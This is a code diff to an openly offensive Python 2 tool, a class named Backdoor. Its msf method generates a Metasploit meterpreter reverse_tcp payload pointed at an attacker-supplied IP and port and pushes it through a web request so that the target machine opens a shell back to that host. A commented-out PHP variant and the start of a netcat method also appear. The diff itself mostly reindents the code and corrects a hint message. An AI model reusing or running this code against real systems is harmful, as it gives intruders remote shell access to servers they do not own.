@@ -35,16 +35,16 @@ class Backdoor(object):
     #    print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
     def msf(self, ip, port):
-		if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
-			print '{0}\n[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
-		else:
-			#phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-			print ''\n{0}[i] Once: \'{1}\' has a listener shell setup on port: \'{2}\'{3}, press: <Return> (hint: get_doc_root LHOST={1} LPORT={2) E){3}'.format(Colors.GREEN,ip, port, Colors.END)
-			print '[i] Generating linux/x86/meterpreter/reverse_tcp'
-			shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-			cmd = '{0} {1} {2} -e /bin/bash'.format(shell, ip, port)
-			self.check = make_request.get_page_source(cmd)
-			print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+        if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
+            print '{0}\n[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
+        else:
+            #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+            print '\n{0}[i] Once: \'{1}\' has a listener shell setup on port: \'{2}\'{3}, press: <Return> (hint: msfcli LHOST={1} LPORT={2) E){3}'.format(Colors.GREEN,ip, port, Colors.END)
+            print '[i] Generating linux/x86/meterpreter/reverse_tcp'
+            shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+            cmd = '{0} {1} {2} -e /bin/bash'.format(shell, ip, port)
+            self.check = make_request.get_page_source(cmd)
+            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
     def netcat(self, ip, port):
         '''
